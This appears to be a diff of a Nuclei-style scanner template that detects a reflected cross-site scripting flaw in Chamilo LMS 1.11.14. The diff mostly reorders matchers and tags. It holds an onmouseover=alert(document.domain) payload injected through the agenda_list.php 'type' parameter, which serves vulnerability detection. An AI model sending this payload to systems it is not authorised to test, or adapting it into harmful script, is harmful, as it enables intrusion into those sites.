@@ -1,5 +1,4 @@
 id: chamilo-lms-xss
-
 info:
   name: Chamilo LMS 1.11.14 Cross-Site Scripting
   author: geeknik
@@ -11,29 +10,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-83
   metadata:
     max-request: 1
-  tags: xss,chamilo,vuln
-
+  tags: chamilo,vuln,xss
 http:
-  - method: GET
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - agenda_js.php?type=xss" onmouseover=alert(document.domain)
+      - status:
+          - 200
+        type: status
+      - part: header
+        type: word
+        words:
+          - text/html
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'agenda_js.php?type=xss" onmouseover=alert(document.domain)'
-
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
